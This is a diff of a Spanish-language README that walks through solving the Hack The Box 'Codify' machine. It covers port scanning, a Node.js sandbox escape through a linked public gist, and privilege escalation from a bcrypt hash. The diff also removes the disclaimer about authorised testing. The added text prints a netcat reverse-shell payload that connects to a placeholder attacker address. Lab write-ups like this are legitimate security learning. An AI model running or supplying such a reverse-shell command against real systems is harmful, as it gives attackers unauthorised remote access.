@@ -16,37 +16,25 @@ Este repositorio contiene una detallada guía paso a paso sobre cómo resolví l
 
 El propósito principal de este repositorio es educativo. Busco compartir mi enfoque y las lecciones aprendidas con la comunidad para que otros puedan aprender de la experiencia y, potencialmente, aplicar estos conocimientos en sus propios desafíos de pentesting y ciberseguridad.
 
-## Disclaimer
+## Análisis Inicial y Enumeración
 
-Este trabajo se realiza puramente con fines educativos. No fomento ni apruebo el acceso no autorizado a sistemas informáticos. Es crucial tener permiso explícito antes de intentar cualquier prueba de penetración o ataque a sistemas.
+El primer paso en cualquier desafío de CTF (Capture The Flag) es comprender el terreno. Para ello, arranqué la máquina "Codify" en Hack The Box y utilicé `nmap`, una herramienta esencial en el arsenal de cualquier entusiasta de la seguridad, para realizar un escaneo de los puertos. El escaneo reveló tres puertos abiertos: 22 (SSH), 8080 y 3000.
 
-## Proceso de Resolución
+El puerto 8080 generalmente aloja aplicaciones web, pero en este caso, intentar acceder resultó en una redirección a un callejón sin salida. Los desarrolladores a menudo utilizan el puerto 3000 para pruebas locales, lo que me hizo pensar que podría contener una pista crucial. Al visitar este puerto en mi navegador, me encontré con una página web que presentaba un entorno sandbox para ejecutar código Javascript
 
-### Análisis Inicial y Enumeración de Puertos
+## Explotación del Entorno Sandbox
 
-- Inicio de la máquina en Hack The Box.
-- Ejecución de un escaneo `nmap` revelando 3 puertos abiertos: 22 (SSH), 8080 y 3000.
-- El puerto 8080 no está disponible debido a una redirección.
-- El puerto 3000 muestra una página web que permite la ejecución de código Node.js en un entorno sandbox.
+La página web en el puerto 3000 era un rompecabezas en sí misma, dividida en varias secciones incluyendo 'About Us', 'Editor', 'Limitations', y una página de bienvenida. La sección 'Limitations' era particularmente interesante, ya que detallaba las restricciones impuestas a la ejecución del código, excluyendo explícitamente módulos potencialmente peligrosos como `fs` y `child_process`. Estas restricciones sugieren una protección consciente contra ataques maliciosos, pero también señalan hacia las vulnerabilidades que el creador consideró más críticas.
 
-### Explotación
+La verdadera mina de oro estaba en 'About Us', donde se mencionaba la librería usada para sandboxing. Una búsqueda en el repositorio de GitHub de la librería reveló varias vulnerabilidades documentadas. Probé varias hasta encontrar una que permitiera ejecutar código fuera del sandbox, utilizando [Gist de GitHub](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac).
 
-- Navegación por la página web del puerto 3000 revela varias secciones: 'About us', 'Editor', 'Limitations', y una página de bienvenida.
-- La sección 'Limitations' indica que los módulos `fs` y `child_process` están restringidos.
-- En 'About us', se menciona la librería utilizada para el sandbox, la cual tiene vulnerabilidades conocidas según su repositorio de GitHub.
-- Utilización de una vulnerabilidad específica de escape de sandbox ([Referencia de Gist](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)) para ejecutar código fuera del sandbox.
+## Establecimiento de un Shell Inverso
 
-### Obtención de Shell Inverso
+Ahora que estaba fuera del sandbox, el siguiente paso lógico era establecer un shell inverso. Este proceso, aunque familiar, requirió paciencia y precisión para adaptar el ataque al entorno específico de "Codify". Tras varios intentos y ajustes de mi payload, `netcat` me brindó ese preciado prompt de shell, marcando la primera victoria significativa en esta batalla.
 
-- Intentos de obtener un shell inverso mediante `netcat`, logrando finalmente acceso al shell de la máquina.
+Payload: mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP_ATACANTE PUERTO_ATACANTE > /tmp/f; rm /tmp/f
 
-### Inicio de Escalada de Privilegios
 
-- Búsqueda en los directorios de la aplicación web lleva al descubrimiento de una posible contraseña en forma de hash bcrypt.
+## Escalada de Privilegios: El Desafío Continúa
 
-## Herramientas y Técnicas Utilizadas
-
-- `nmap` para la enumeración de puertos.
-- Análisis manual de la aplicación web y sus funcionalidades.
-- Explotación de vulnerabilidades conocidas en la librería de sandbox utilizada.
-- `netcat` para obtener un shell inverso.
+Con acceso al sistema, el siguiente objetivo era escalar privilegios. Este paso se convirtió en el más desafiante. Navegando por los directorios del sistema, encontré un archivo que parecía contener una contraseña, oculta en el formato de un hash bcrypt. La naturaleza del hash sugería una fortaleza significativa, pero también representaba una pista crítica hacia la obtención de mayores privilegios en la máquina.
